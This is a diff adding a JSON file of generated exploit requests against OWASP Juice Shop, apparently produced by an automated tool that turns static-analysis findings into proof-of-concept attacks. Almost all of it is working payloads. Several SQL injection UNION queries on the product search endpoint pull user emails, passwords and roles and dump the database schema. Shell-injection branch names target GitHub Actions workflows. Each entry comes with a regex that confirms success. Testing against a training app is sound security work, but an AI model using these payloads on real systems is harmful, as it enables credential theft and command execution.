@@ -1,0 +1,88 @@
+{
+  "metadata": {
+    "target_host": "http://juice-shop:3000",
+    "job_id": "affe836c-e387-4e8a-a137-0a1254614011",
+    "generated_at": "2026-06-02T05:11:47.903706"
+  },
+  "exploits": [
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "High",
+      "method": "POST",
+      "endpoint": "/repository/git/refs",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Git/2.34.1"
+      },
+      "body": "{\"ref\": \"refs/heads/feature-branch;echo SAST_COMMAND_INJECTION_SUCCESS;id\", \"sha\": \"deadbeefdeadbeefdeadbeefdeadbeefdeadbeef\"}",
+      "expected_success_regex": "SAST_COMMAND_INJECTION_SUCCESS.*uid=\\d+\\(\\w+\\)\\s+gid=\\d+\\(\\w+\\)"
+    },
+    {
+      "vuln_type": "[SAST] yaml.github-actions.security.run-shell-injection.run-shell-injection",
+      "severity": "High",
+      "method": "POST",
+      "endpoint": "SAST_FINDING",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"description\": \"This payload represents the malicious branch name. When the GitHub Actions workflow is triggered on a branch with this name, the command injection vulnerability is exploited.\", \"malicious_branch_name\": \"poc/fix-branch;id;echo 'GitHub-Actions-Injected'\"}",
+      "expected_success_regex": "GitHub-Actions-Injected|uid=\\d+\\(.*\\) gid=\\d+\\(.*\\)"
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "High",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=a')) UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--",
+      "headers": {},
+      "body": "",
+      "expected_success_regex": "admin@juice-sh.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "High",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q='));--",
+      "headers": {},
+      "body": "",
+      "expected_success_regex": "\"name\":\"OWASP Juice Shop Sticker\""
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "High",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=a')) UNION SELECT id,email,password,null,null,null,createdAt,updatedAt,null FROM Users--",
+      "headers": {},
+      "body": null,
+      "expected_success_regex": "admin@juice-sh.op"
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "High",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=') UNION SELECT name, sql, null, null, null, null, null, null, null FROM sqlite_master--",
+      "headers": {},
+      "body": "",
+      "expected_success_regex": "CREATE\\s+TABLE\\s+[`\"]?Users[`\"]?"
+    },
+    {
+      "vuln_type": "[SAST] javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+      "severity": "High",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=') UNION SELECT '1','SQLINJECTIONSUCCESS','This product proves the SQL Injection vulnerability.','4','5','6','7',null--",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": null,
+      "expected_success_regex": "(?i)\"name\"\\s*:\\s*\"SQLINJECTIONSUCCESS\""
+    },
+    {
+      "vuln_type": "[SAST] javascript.express.security.injection.tainted-sql-string.tainted-sql-string",
+      "severity": "High",
+      "method": "GET",
+      "endpoint": "/rest/products/search?q=') UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--",
+      "headers": {},
+      "body": null,
+      "expected_success_regex": "admin@juice-sh\\.op"
+    }
+  ]
+}
